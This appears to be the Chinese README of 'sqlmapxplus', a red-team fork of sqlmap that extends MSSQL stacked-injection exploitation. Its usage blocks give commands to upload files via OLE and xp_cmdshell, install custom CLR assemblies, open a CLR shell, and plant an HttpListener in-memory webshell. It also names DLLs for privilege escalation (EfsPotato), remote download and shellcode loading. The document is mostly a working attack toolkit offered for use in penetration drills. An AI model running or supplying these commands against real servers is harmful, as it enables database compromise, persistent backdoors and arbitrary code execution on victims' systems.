## sqlmapxplus

### 简介

在众多的地区性攻防演练中，SQL Server数据库堆叠注入仍有较高的爆洞频率，但因为一些常见的演练场景限制，如不出网、低权限、站库分离、终端防护、上线困难、权限维持繁琐等，仅一个--os-shell已经难满足我们的需求。

sqlmapxplus 基于sqlmap，对经典的数据库漏洞利用工具进行二开，参考各种解决方法，增加MSSQL数据库注入的利用方式。目前已完成部分二开，包括ole、xpcmdshell两种文件上传、内存马上传、clr安装功能，能够实现mssql注入场景下的自动化注入内存马、自动化提权、自动化添加后门用户、自动化远程文件下载、自动化shellcode加载功能。

1. **更新说明**：
   新增开启ole功能
   新增指定文件读取功能
   新增指定文件移动功能
   新增指定文件复制功能
   新增指定文件删除功能
   新增指定文件位置判断功能
   新增存储过程查询功能
   新增删除存储过程功能
   修改ole上传方式
   修改clr安装流程
   修改clr命令执行方式
   去除中文注释导致的报错
2. 针对实际网络过程中dll传输损失导致clr安装失败的问题（临时解决方法）
   发现在原--install-clr功能中使用的clr dll太大，在实战中往往需要注入的大量次数，如果注入过程中的某一次出现错误，会导致dll落地失败，无法成功打入dll，现将原本一键自动安装的流程去除，修改为用户需要根据实际的目标情况，自定义的dll安装
   临时增加 --check-file 选项判断dll文件是否成功落地目标主机
   临时增加--check-clr 判断用户自定义函数是否在数据库中加载成功

3. 为什么使用上传过程中会出现dll放大的问题
   转换为十六进制落地再还原导致的文件增大，如字母 A 经过十六进制 会转换 为 41，增大一倍

4. 自定义clr的问题（已完成）
   install-clr修改为，需要指定自定义的clr.dll路径，在提示框输入 用户自定义类名 用户自定义方法名
   clr_shell模式下执行clr函数的方式修改为： 用户自定义function 传入参数（已完成）

### Update

```
File system access:
--xp-upload   upload file by xp_cmdshell 
--ole-upload  upload file by ole 
--check-file  use xp_fileexis check file exist 
--ole-del  	  delete file by ole 
--ole-read    read file content by ole 
--ole-move    move file by ole 
--ole-copy    copy file by ole 

Operating system access:
--enable-clr        enable clr 
--disable-clr       disable clr
--enable-ole        enable ole 
--check-clr   check user-defined functions in the database
--del-clr   delete user-defined functions in the database
--install-clr       install clr
--clr-shell         clr shell 
--sharpshell-upload1  sharpshell upload1
--sharpshell-upload2  sharpshell upload2 
```

### Usage

**about ole**:

```
# 开启 ole 利用功能
python sqlmap.py -r/-u xxx --enable-ole 

# 通过 ole 上传文件
python sqlmap.py -r/-u xxx --ole-upload local_file_path --file-dest remote_file_path

# 通过 ole 删除指定文件
python sqlmap.py -r/-u xxx --ole-del remote_file_path

# 通过 ole 阅读指定文件
python sqlmap.py -r/-u xxx --ole-read remote_file_path

# 通过 ole 移动并重命名文件
python sqlmap.py -r/-u xxx --ole-move remote_file_path1 --file-dest remote_file_path

# 通过 ole 复制文件
python sqlmap.py -r/-u xxx --ole-copy remote_file_path1 --file-dest remote_file_path2

# 通过 ole 实现的HttpListener内存马上传方式
# 默认上传至c:\Windows\tasks\listen.tmp.txt，需要以system权限运行
python sqlmap.py -r/-u xxx --sharpshell-upload2 
```

**other function:**

```
# 通过 xp_cmdshell 上传文件
python sqlmap.py -r/-u xxx --xp-upload local_file_path --file-dest remote_file_path

# 使用 xp_fileexis 来检查文件是否存在
python sqlmap.py -r/-u xxx --check-file remote_file_path

# 查询数据库中是否存在用户自定义函数
python sqlmap.py -r/-u xxx --check-clr clr_function_name

# 删除用户自定义函数
python sqlmap.py -r/-u xxx --del-clr clr_function_name

# 通过 xp_cmdshell实现的HttpListener内存马上传方式
# 默认上传至c:\Windows\tasks\listen.tmp.txt，需要以system权限运行
python sqlmap.py -r/-u xxx --sharpshell-upload1 
```

**about clr**:

```
# 开启 clr 利用功能
python sqlmap.py -r/-u xxx --enable-clr 

# 关闭 clr 利用功能
python sqlmap.py -r/-u xxx --disable-clr

# 进入 clr 安装模式
python sqlmap.py -r/-u xxx --install-clr

# 进入 clr-shell 命令交互模式
python sqlmap.py -r/-u xxx --clr-shell 

# clr dll 参考如下，更多其他dll请参考星球获取
# 存储过程类名Xplus，存储过程函数名需要注意大小写，分别为
# ClrExec、ClrEfsPotato、ClrDownload、ClrShellcodeLoader​
# 对应项目目录下单独功能的dll，分别为
clrexec.dll
clrefspotato.dll
clrdownload.dll
clrshellcodeloader.dl
```

### 其他

公众号：赛博大作战

知识星球：渗透测试宝典

旧版本的参考链接：https://mp.weixin.qq.com/s/nTYPKnl9XQLWhZ43sQV3xw

新版本的参考链接：待发布

### References

https://github.com/sqlmapproject/sqlmap 

https://github.com/uknowsec/SharpSQLTools

https://github.com/Anion3r/MSSQLProxy

https://mp.weixin.qq.com/s/X0cI85DdB17Wve2qzCRDbg

https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/
